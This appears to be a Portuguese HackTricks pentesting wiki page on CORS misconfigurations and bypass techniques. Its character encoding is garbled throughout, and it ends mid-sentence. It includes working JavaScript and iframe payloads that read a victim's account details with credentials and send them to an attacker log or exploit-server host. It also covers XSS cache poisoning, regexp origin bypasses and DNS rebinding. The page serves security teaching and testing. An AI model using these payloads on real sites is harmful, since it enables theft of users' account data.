# CORS - Configura√ß√µes Incorretas e Bypass

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## O que √© CORS?

O padr√£o CORS (Compartilhamento de Recursos de Origem Cruzada) √© necess√°rio porque ele **permite que servidores especifiquem quem pode acessar seus ativos** e quais **m√©todos de solicita√ß√£o HTTP s√£o permitidos** a partir de recursos externos.

Uma pol√≠tica de **mesma origem** requer que tanto o **servidor solicitante** de um recurso quanto o servidor onde o **recurso** est√° localizado usem o mesmo protocolo ([http://), nome de dom√≠nio](http://\), nome de dom√≠nio) e a mesma **porta** (80). Ent√£o, se o servidor for√ßa a pol√≠tica de mesma origem, apenas p√°ginas da web do mesmo dom√≠nio e porta poder√£o acessar os recursos.

A tabela a seguir mostra como a pol√≠tica de mesma origem ser√° aplicada em `http://normal-website.com/example/example.html` :

| URL acessada                              | Acesso permitido?                  |
| ----------------------------------------- | ---------------------------------- |
| `http://normal-website.com/example/`      | Sim: mesmo esquema, dom√≠nio e porta |
| `http://normal-website.com/example2/`     | Sim: mesmo esquema, dom√≠nio e porta |
| `https://normal-website.com/example/`     | N√£o: esquema e porta diferentes    |
| `http://en.normal-website.com/example/`   | N√£o: dom√≠nio diferente              |
| `http://www.normal-website.com/example/`  | N√£o: dom√≠nio diferente              |
| `http://normal-website.com:8080/example/` | N√£o: porta diferente\*              |

\*_O Internet Explorer permitir√° esse acesso porque o IE n√£o leva em conta o n√∫mero da porta ao aplicar a pol√≠tica de mesma origem._

### Cabe√ßalho `Access-Control-Allow-Origin`

A especifica√ß√£o de `Access-Control-Allow-Origin` permite **m√∫ltiplas origens**, ou o valor **`null`**, ou o caractere coringa **`*`**. No entanto, **nenhum navegador suporta m√∫ltiplas origens** e h√° **restri√ß√µes** no uso do **coringa** `*`. (_O caractere coringa s√≥ pode ser usado sozinho, isso falhar√° `Access-Control-Allow-Origin: https://*.normal-website.com` e n√£o pode ser usado com_ _Access-Control-Allow-Credentials: true_)

Este cabe√ßalho √© **retornado por um servidor** quando um site solicita um recurso de outro dom√≠nio, com um cabe√ßalho `Origin` adicionado pelo navegador.

### Cabe√ßalho `Access-Control-Allow-Credentials`

O comportamento **padr√£o** das solicita√ß√µes de recursos de origem cruzada √© que as **solicita√ß√µes** sejam **passadas sem credenciais** como cookies e o cabe√ßalho de autoriza√ß√£o. No entanto, o servidor de origem cruzada pode **permitir a leitura** da **resposta** quando as **credenciais** s√£o **passadas** para ele definindo o cabe√ßalho CORS **`Access-Control-Allow-Credentials`** como **`true`**.

Se o valor for definido como `true`, o navegador enviar√° credenciais (cookies, cabe√ßalhos de autoriza√ß√£o ou certificados de cliente TLS).
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
        console.log(xhr.responseText);
    }
}
xhr.open('GET', 'http://example.com/', true); 
xhr.withCredentials = true; 
xhr.send(null);
```

```javascript
fetch(url, {
  credentials: 'include'  
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### Pedido de pr√©-voo

Em certas circunst√¢ncias, quando um pedido de dom√≠nio cruzado:

* inclui um **m√©todo HTTP n√£o padr√£o (HEAD, GET, POST)**
* inclui novos **cabe√ßalhos**
* inclui um valor de cabe√ßalho **Content-Type especial**

{% hint style="info" %}
**Verifique** [**neste link**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests) **as condi√ß√µes de um pedido para evitar o envio de um pedido de pr√©-voo**
{% endhint %}

o pedido de origem cruzada √© precedido por um **pedido** usando o m√©todo **`OPTIONS`**, e o protocolo CORS exige uma verifica√ß√£o inicial sobre quais **m√©todos e cabe√ßalhos s√£o permitidos antes de permitir o pedido de origem cruzada**. Isso √© chamado de **verifica√ß√£o de pr√©-voo**. O servidor **retorna uma lista de m√©todos permitidos** al√©m da **origem confi√°vel** e o navegador verifica se o m√©todo do site solicitante √© permitido.

{% hint style="danger" %}
Observe que, **mesmo que um pedido de pr√©-voo n√£o seja enviado** porque as condi√ß√µes do "pedido regular" s√£o respeitadas, a **resposta precisa ter os cabe√ßalhos de autoriza√ß√£o** ou o **navegador n√£o poder√° ler a resposta** do pedido.
{% endhint %}

Por **exemplo**, este √© um pedido de pr√©-voo que est√° buscando **usar o m√©todo `PUT`** juntamente com um **cabe√ßalho de pedido personalizado** chamado `Special-Request-Header`:
```
OPTIONS /data HTTP/1.1
Host: <some website>
...
Origin: https://normal-website.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Special-Request-Header
```
O servidor pode retornar uma resposta como a seguinte:
```
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Special-Request-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
* `Access-Control-Allow-Headers` Cabe√ßalhos permitidos
* `Access-Control-Expose-Headers` Cabe√ßalhos expostos
* `Access-Control-Max-Age` Define um per√≠odo m√°ximo para armazenar em cache a resposta pr√©-voo para reutiliza√ß√£o
* `Access-Control-Request-Headers` O cabe√ßalho que a solicita√ß√£o de origem cruzada deseja enviar
* `Access-Control-Request-Method` O m√©todo que a solicita√ß√£o de origem cruzada deseja usar
* `Origin` Origem da solicita√ß√£o de origem cruzada (definido automaticamente pelo navegador)

![](../.gitbook/assets/preflight.svg)

Observe que geralmente (dependendo do tipo de conte√∫do e cabe√ßalhos definidos) em uma solicita√ß√£o **GET/POST, nenhuma solicita√ß√£o pr√©-voo √© enviada** (a solicita√ß√£o √© enviada **diretamente**), mas se voc√™ quiser acessar os **cabe√ßalhos/corpo da resposta**, ela deve conter um cabe√ßalho _Access-Control-Allow-Origin_ permitindo isso.\
**Portanto, o CORS n√£o protege contra CSRF (mas pode ser √∫til).**

### **Solicita√ß√£o pr√©-voo de rede local**

Quando uma solicita√ß√£o √© enviada para um endere√ßo IP de rede local, 2 cabe√ßalhos CORS adicionais s√£o enviados:

* O cabe√ßalho de solicita√ß√£o do cliente `Access-Control-Request-Local-Network` indica que a solicita√ß√£o √© uma solicita√ß√£o de rede local
* O cabe√ßalho de resposta do servidor `Access-Control-Allow-Local-Network` indica que um recurso pode ser compartilhado com seguran√ßa com redes externas

Uma **resposta v√°lida permitindo a solicita√ß√£o de rede local** tamb√©m precisa ter na resposta o cabe√ßalho `Access-Controls-Allow-Local_network: true`:
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://public.example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
Observe que o IP linux **0.0.0.0** funciona para **burlar** esses requisitos para acessar o localhost, pois esse endere√ßo IP n√£o √© considerado "local".

Tamb√©m √© poss√≠vel **burlar os requisitos da Rede Local** se voc√™ usar o **endere√ßo IP p√∫blico de um endpoint local** (como o IP p√∫blico do roteador). Porque em v√°rias ocasi√µes, mesmo que o **IP p√∫blico** seja acessado, se for **da rede local**, o acesso ser√° concedido.


{% endhint %}

## Configura√ß√µes incorretas explor√°veis

Observe que a maioria dos **ataques reais requer que `Access-Control-Allow-Credentials`** seja definido como **`true`** porque isso permitir√° que o navegador envie as credenciais e leia a resposta. Sem credenciais, muitos ataques se tornam irrelevantes; isso significa que voc√™ n√£o pode usar os cookies do usu√°rio, ent√£o muitas vezes n√£o h√° nada a ser ganho fazendo com que o navegador deles emita a solicita√ß√£o em vez de emitir voc√™ mesmo.

Uma exce√ß√£o not√°vel √© quando a **localiza√ß√£o da rede da v√≠tima funciona como uma esp√©cie de autentica√ß√£o**. Voc√™ pode usar o navegador da v√≠tima como um proxy para ignorar a autentica√ß√£o baseada em IP e acessar aplicativos de intranet. Em termos de impacto, isso √© semelhante ao DNS rebinding, mas muito menos complicado de explorar.

### Reflected `Origin` in `Access-Control-Allow-Origin`

No mundo real, isso n√£o pode acontecer, pois **esses 2 valores dos cabe√ßalhos s√£o proibidos juntos**.\
Tamb√©m √© verdade que muitos desenvolvedores desejam **permitir v√°rios URLs no CORS**, mas curingas de subdom√≠nio ou listas de URLs n√£o s√£o permitidos. Ent√£o, v√°rios desenvolvedores **geram** o cabe√ßalho \*\*`Access-Control-Allow-Origin`\*\* **dinamicamente**, e em mais de uma ocasi√£o eles apenas **copiam o valor do cabe√ßalho Origin**.

Nesse caso, a **mesma vulnerabilidade pode ser explorada.**

Em outros casos, o desenvolvedor poderia verificar se o **dom√≠nio** (_victimdomain.com_) **aparece** no cabe√ßalho Origin, ent√£o, um atacante pode usar um dom√≠nio chamado **`attackervictimdomain.com`** para roubar informa√ß√µes confidenciais.
```html
<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','https://acc21f651fde5631c03665e000d90048.web-security-academy.net/accountDetails',true);
   req.withCredentials = true;
   req.send();

   function reqListener() {
       location='/log?key='+this.responseText;
   };
</script>
```
### A Origem `null`

`null` √© um valor especial para o cabe√ßalho **Origin**. A especifica√ß√£o menciona que ele √© acionado por redirecionamentos e arquivos HTML locais. Algumas aplica√ß√µes podem permitir a origem `null` na lista branca para suportar o desenvolvimento local da aplica√ß√£o.\
Isso √© interessante porque **v√°rias aplica√ß√µes permitir√£o esse valor** dentro do CORS e qualquer **site pode facilmente obter a origem nula usando um iframe isolado**:
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://acd11ffd1e49837fc07b373a00eb0047.web-security-academy.net/accountDetails',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
    location='https://exploit-accd1f8d1ef98341c0bc370201c900f2.web-security-academy.net//log?key='+encodeURIComponent(this.responseText);
  };
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://acd11ffd1e49837fc07b373a00eb0047.web-security-academy.net/accountDetails',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
    location='https://exploit-accd1f8d1ef98341c0bc370201c900f2.web-security-academy.net//log?key='+encodeURIComponent(this.responseText);
  };
</script>"></iframe>
```
### **Burlas de Regexp**

Se voc√™ descobriu que o dom√≠nio _victim.com_ est√° na **lista branca**, voc√™ deve verificar se _victim.com.**attacker.com**_ tamb√©m est√° na **lista branca**, ou, caso voc√™ possa **assumir algum subdom√≠nio**, verifique se _**somesubdomain**.victim.com_ est√° na lista branca.

### **Burlas de Regexp Avan√ßadas**

A maioria das express√µes regulares usadas para identificar o dom√≠nio dentro da string se concentrar√° em caracteres alfanum√©ricos ASCII e `.-`. Ent√£o, algo como `victimdomain.com{.attacker.com` dentro do cabe√ßalho de Origem ser√° interpretado pela express√£o regular como se o dom√≠nio fosse `victimdomain.com`, mas o navegador (neste caso, o Safari suporta esse caractere no dom√≠nio) acessar√° o dom√≠nio `attacker.com`.

O caractere `_` (em subdom√≠nios) n√£o √© apenas suportado no Safari, mas tamb√©m no Chrome e no Firefox!

**Ent√£o, usando um desses subdom√≠nios, voc√™ pode burlar algumas express√µes regulares "comuns" para encontrar o dom√≠nio principal de uma URL.**

**Para obter mais informa√ß√µes e configura√ß√µes dessa burla, consulte:** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **e** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![](<../.gitbook/assets/image (153).png>)

### A partir de XSS dentro de um subdom√≠nio

Um mecanismo de defesa que os desenvolvedores usam contra a explora√ß√£o do CORS √© listar em branco os dom√≠nios que frequentemente solicitam acesso a informa√ß√µes. No entanto, isso n√£o √© totalmente seguro, porque se **um** dos subdom√≠nios do dom√≠nio **listado em branco** for **vulner√°vel** a outros exploits, como **XSS**, ele pode permitir a explora√ß√£o do CORS.

Vamos considerar um exemplo, o c√≥digo a seguir mostra a configura√ß√£o que permite que subdom√≠nios de _requester.com_ acessem recursos de _provider.com_.
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com')
 {
  //Access data
  else{ // unauthorized access}
}
```
Supondo que um usu√°rio tenha acesso a sub.requester.com, mas n√£o a requester.com, e supondo que `sub.requester.com` seja vulner√°vel a XSS. O usu√°rio pode explorar `provider.com` usando o m√©todo de ataque de script entre sites.

### **Envenenamento de cache do lado do servidor**

Se as estrelas estiverem alinhadas, podemos usar o envenenamento de cache do lado do servidor via inje√ß√£o de cabe√ßalho HTTP para criar uma vulnerabilidade [XSS armazenada](https://portswigger.net/web-security/cross-site-scripting/stored).

Se um aplicativo **reflete** o **cabe√ßalho de origem** sem nem mesmo verific√°-lo quanto a caracteres ilegais como `,` efetivamente temos uma vulnerabilidade de inje√ß√£o de cabe√ßalho HTTP contra usu√°rios do IE/Edge, j√° que o Internet Explorer e o Edge veem \r (0x0d) como um terminador de cabe√ßalho HTTP v√°lido: `GET / HTTP/1.1`\
`Origin: z[0x0d]Content-Type: text/html; charset=UTF-7`

O Internet Explorer v√™ a resposta como:

`HTTP/1.1 200 OK`\
`Access-Control-Allow-Origin: z`\
`Content-Type: text/html; charset=UTF-7`

Isso n√£o √© diretamente explor√°vel porque n√£o h√° como um invasor fazer o navegador web de algu√©m enviar um cabe√ßalho malformado como esse, mas eu posso **criar manualmente essa solicita√ß√£o no Burp Suite e um cache do lado do servidor pode salvar a resposta e servi-la para outras pessoas**. O payload que usei mudar√° o conjunto de caracteres da p√°gina para **UTF-7**, que √© notoriamente √∫til para criar vulnerabilidades XSS.

### **Envenenamento de cache do lado do cliente**

Voc√™ pode ter encontrado ocasionalmente uma p√°gina com [XSS refletido](https://portswigger.net/web-security/cross-site-scripting/reflected) em um cabe√ßalho HTTP personalizado. Digamos que uma p√°gina da web reflita o conte√∫do de um cabe√ßalho personalizado sem codifica√ß√£o:
```http
GET / HTTP/1.1  
Host: example.com  
X-User-id: &lt;svg/onload=alert\(1\)&gt;

HTTP/1.1 200 OK  
Access-Control-Allow-Origin: \*  
Access-Control-Allow-Headers: X-User-id  
Content-Type: text/html  
...  
Invalid user: &lt;svg/onload=alert\(1\)&gt;\
```
Com o CORS, podemos enviar qualquer valor no Header. Por si s√≥, isso √© in√∫til, j√° que a resposta contendo nosso JavaScript injetado n√£o ser√° renderizada. No entanto, se Vary: Origin n√£o tiver sido especificado, a resposta pode ser armazenada no cache do navegador e exibida diretamente quando o navegador navegar para a URL associada. Eu criei um fiddle para tentar esse ataque em uma URL de sua escolha. Como esse ataque usa o cache do lado do cliente, ele √© bastante confi√°vel.
```markup
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // beware of mixed content blocking when targeting HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>")
req.send();
</script>
```
## Bypass

### XSSI (Inclus√£o de Script entre Sites) / JSONP

XSSI designa um tipo de vulnerabilidade que explora o fato de que, quando um recurso √© inclu√≠do usando a tag `script`, a SOP n√£o se aplica, porque os scripts devem ser capazes de serem inclu√≠dos entre dom√≠nios. Um atacante pode, assim, ler tudo o que foi inclu√≠do usando a tag `script`.

Isso √© especialmente interessante quando se trata de JavaScript din√¢mico ou JSONP, quando informa√ß√µes de autoridade ambiental, como cookies, s√£o usadas para autentica√ß√£o. Os cookies s√£o inclu√≠dos ao solicitar um recurso de um host diferente. Plugin do BurpSuite: [https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp)

[**Leia mais sobre os diferentes tipos de XSSI e como explor√°-los aqui.**](xssi-cross-site-script-inclusion.md)

Tente adicionar um **par√¢metro de retorno de chamada** (**`callback`**) na solicita√ß√£o. Talvez a p√°gina tenha sido preparada para enviar os dados como JSONP. Nesse caso, a p√°gina enviar√° de volta os dados com `Content-Type: application/javascript`, o que contornar√° a pol√≠tica CORS.

![](<../.gitbook/assets/image (229).png>)

### Bypass f√°cil (in√∫til?)

Voc√™ pode pedir a um aplicativo da web para fazer uma solicita√ß√£o para voc√™ e enviar de volta a resposta. Isso contornar√° o **`Access-Control-Allow-Origin`**, mas observe que as **credenciais para a v√≠tima final n√£o ser√£o enviadas** porque voc√™ estar√° **entrando em contato com um dom√≠nio diferente** (aquele que far√° a solicita√ß√£o para voc√™).

[**CORS-escape**](https://github.com/shalvah/cors-escape)

CORS-escape fornece um **proxy** que **encaminha** nossa **solicita√ß√£o** juntamente com seus **cabe√ßalhos**, e tamb√©m **finge** o cabe√ßalho **Origin** (Origin = **dom√≠nio solicitado**). Assim, a **pol√≠tica CORS √© contornada**.\
O c√≥digo-fonte est√° [no Github](https://github.com/shalvah/cors-escape), para que voc√™ possa **hospedar o seu pr√≥prio**.
```javascript
xhr.open("GET", "https://cors-escape.herokuapp.com/https://maximum.blog/@shalvah/posts");
```
[**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape)

Proxying √© como "passar" sua solicita√ß√£o, exatamente como voc√™ a enviou. Poder√≠amos resolver isso de uma maneira alternativa que ainda envolve outra pessoa fazendo a solicita√ß√£o para voc√™, mas desta vez, **em vez de passar sua solicita√ß√£o, o servidor faz sua pr√≥pria solicita√ß√£o, mas com os par√¢metros que voc√™ especificou.**

### Bypass de Iframe + Popup

Voc√™ pode **burlar verifica√ß√µes CORS** como `e.origin === window.origin` **criando um iframe** e **a partir dele abrindo uma nova janela**. Mais informa√ß√µes na seguinte p√°gina:

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### DNS Rebinding via TTL

![](<../.gitbook/assets/image (108).png>)

Basicamente, voc√™ faz a **v√≠tima acessar sua p√°gina**, ent√£o voc√™ muda o **DNS do seu dom√≠nio (o IP)** e faz com que ele **aponte** para a **p√°gina da web da v√≠tima**. Voc√™ faz sua **v√≠tima executar** (**JS**) algo quando o **TTL acabar** para que uma nova solicita√ß√£o DNS seja feita e, em seguida, voc√™ poder√° coletar as informa√ß√µes (como voc√™ sempre mant√©m o usu√°rio em seu dom√≠nio, ele n√£o enviar√° nenhum cookie para o servidor da v√≠tima, ent√£o essa op√ß√£o **abusa dos privil√©gios especiais do IP da v√≠tima**).

Mesmo que voc√™ defina o **TTL muito baixo** (0 ou 1), os **navegadores t√™m um cache** que **impedir√°** que voc√™ **abusar** disso por v√°rios segundos / minutos.

Portanto, essa t√©cnica √© √∫til para **burlar verifica√ß√µes expl√≠citas** (a v√≠tima est√° **realizando explicitamente uma solicita√ß√£o DNS** para verificar o IP do dom√≠nio e quando o bot √© chamado, ele far√° o seu pr√≥prio).

Ou quando voc√™ pode ter um **usu√°rio / bot na mesma p√°gina por um longo tempo** (para que voc√™ possa **esperar** at√© que o **cache expire**).

Se voc√™ precisar de algo r√°pido para abusar disso, pode usar um servi√ßo como [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html).

Se voc√™ quiser executar seu pr√≥prio servidor de DNS rebinding, pode usar algo como [**DNSrebinder**](https://github.com/mogwailabs/DNSrebinder)**,** em seguida, **expor** a **porta local 53/udp**, criar um **registro A apontando para ele** (ns.example.com) e criar um **registro NS** apontando para o **subdom√≠nio A criado anteriormente** (ns.example.com).\
Ent√£o, qualquer subdom√≠nio desse subdom√≠nio (ns.example.com) ser√° resolvido pelo seu host.

Confira tamb√©m o **servidor em execu√ß√£o publicamente em** [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)

### DNS Rebinding via **DNS Cache Flooding**

Como foi explicado na se√ß√£o anterior, os **navegadores** t√™m os IPs dos dom√≠nios **armazenados em cache por mais tempo** do que o especificado no TTL. No entanto, h√° uma maneira de burlar essa defesa.

Voc√™ pode ter um trabalhador de servi√ßo que **inunda o cache DNS para for√ßar uma segunda solicita√ß√£o DNS**. Ent√£o, o fluxo ser√° como:

1. Solicita√ß√£o DNS respondida com o endere√ßo do atacante
2. O trabalhador de servi√ßo inunda o cache DNS (o nome do servidor atacante em cache √© exclu√≠do)
3. Segunda solicita√ß√£o DNS, desta vez respondida com 127.0.0.1

![](<../.gitbook/assets/image (375) (1).png>)

_Azul √© a primeira solicita√ß√£o DNS e laranja √© a inunda√ß√£o._

### DNS Rebinding via **Cache**

Como foi explicado na se√ß√£o anterior, os **navegadores** t√™m os IPs dos dom√≠nios **armazenados em cache por mais tempo** do que o especificado no TTL. No entanto, h√° outra maneira de burlar essa defesa.

Voc√™ pode **criar 2 registros A** (ou **1 com 2 IPs**, dependendo do provedor) para o **mesmo subdom√≠nio** no **provedor DNS** e quando um navegador os verifica, ele receber√° ambos.

Agora, se o **navegador** decidir **usar o endere√ßo IP do atacante primeiro**, o **atacante** poder√° **servir** a **carga √∫til** que **realizar√° solicita√ß√µes HTTP** para o mesmo **dom√≠nio**. No entanto, agora que o atacante conhece o IP da v√≠tima, **ele deixar√° de responder ao navegador da v√≠tima**.

Quando o navegador descobrir que o **dom√≠nio n√£o est√° respondendo** a ele, ele **usar√° o segundo IP fornecido**, ent√£o ele **acessar√° um lugar diferente, burlando o SOP**. O atacante pode abusar disso para **obter as informa√ß√µes e exfiltr√°-las**.

{% hint style="warning" %}
Observe que, para acessar o localhost, voc√™ deve tentar restringir **127.0.0.1** no Windows e **0.0.0.0** no Linux.\
Provedores como godaddy ou cloudflare n√£o me permitiram usar o IP 0.0.0.0, mas a AWS route53 me permitiu criar um registro A com 2 IPs, sendo um deles "0.0.0.0"

<img src="../.gitbook/assets/image (638) (2) (1) (1) (1).png" alt="" data-size="original">
{% endhint %}

![](<../.gitbook/assets/image (620) (4).png>)

Para mais informa√ß√µes, voc√™ pode verificar [https://unit42.paloaltonetworks.com/dns-rebinding/](https://unit42.paloaltonetworks.com/dns-rebinding/)

### Outros Bypasses Comuns

* Se **endere√ßos IP internos n√£o s√£o permitidos**, eles podem **ter esquecido de proibir 0.0.0.0** (funciona no Linux e no Mac)
* Se **endere√ßos IP internos n√£o s√£o permitidos**, responda com um **CNAME** para **localhost
